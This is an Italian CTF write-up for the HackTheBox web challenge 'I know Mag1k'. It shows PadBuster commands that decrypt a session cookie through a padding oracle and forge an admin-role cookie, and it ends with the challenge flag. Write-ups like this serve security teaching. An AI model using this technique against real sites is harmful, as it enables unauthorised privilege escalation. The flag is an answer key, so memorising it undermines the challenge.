# I know Mag1k
Can you get to the profile page of the admin?

## Intro
HackTheBox -> Challenges -> Web -> I know Mag1k

## Tools
Tool | Descrizione
------- | ------
Burp Suite | Burp suite è un tool che in questa challenge è usato per analizzare e mdificare le richieste che vengono effetuate dal broswere
[PadBuster](https://github.com/GDSSecurity/PadBuster.git) | PadBuster effettua il Padding oracle attack 

## Description

![login.php]()

1. Utilizzare Burp Suite come proxy per intercettare il traffico
2. Creare un nuovo utente mediante la pagina: register.php

![register.php]()

3. Provare a loggarsi con le credenziali create al punto precedente e analizzare il traffico con Burp Suite
4. I cookie presenti nella richiesta dopo essersi loggati sono:
    - PHPSESSID -3ol2uopq472ov8sigsbmolh9b3
    - __auc - 68adfe0116782dca854895bb93b
    - iknowmag1k - frjPZVShT0wmKOk4kApvD7eezHL6KoAuUUDJb4AcKFabgwRCRgEZ0A%3D%3D
   Ci concentriamo su quest'ultimo cookie (iknowmag1k)

5. Dopo aver cercato su internet e provato alcuni tools si capisce per decifrare questa stringa bisogna utilizzare il Padding oracle attack, che sfrutta il convalidamento del padding del messaggio cifrato per decifrare l'intera stringa. ([Per maggiori informazioni](https://en.wikipedia.org/wiki/Padding_oracle_attack))
6. Utilizzare PadBuster per effetuare una decodifica del cookie tramite il seguente comando:

```bash
padbuster <sito>/profile.php frjPZVShT0wmKOk4kApvD7eezHL6KoAuUUDJb4AcKFabgwRCRgEZ0A%3D%3D --cookies "iknowmag1k=frjPZVShT0wmKOk4kApvD7eezHL6KoAuUUDJb4AcKFabgwRCRgEZ0A%3D%3D" 8 --encoding=0
```

7. Alla fine si ottiene una stringa simile a: {"user":"test","role":"user"}
8. Quindi codificare la stringa {"user":"test","role":"admin"}, con il seguente comando:

```bash
padbuster <sito>/profile.php frjPZVShT0wmKOk4kApvD7eezHL6KoAuUUDJb4AcKFabgwRCRgEZ0A%3D%3D --cookies "iknowmag1k=frjPZVShT0wmKOk4kApvD7eezHL6KoAuUUDJb4AcKFabgwRCRgEZ0A%3D%3D" 8 --encoding=0 --plaintext "{"user":"test","role":"admin"}"
```

9. Adesso si ricarica la pagina dell'utente e con Burp Suite si modifica il cookie con la stringa appena ottenuta

![profile.php]()

## FLAG
HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}

## Creatore
Alessandro Morelli

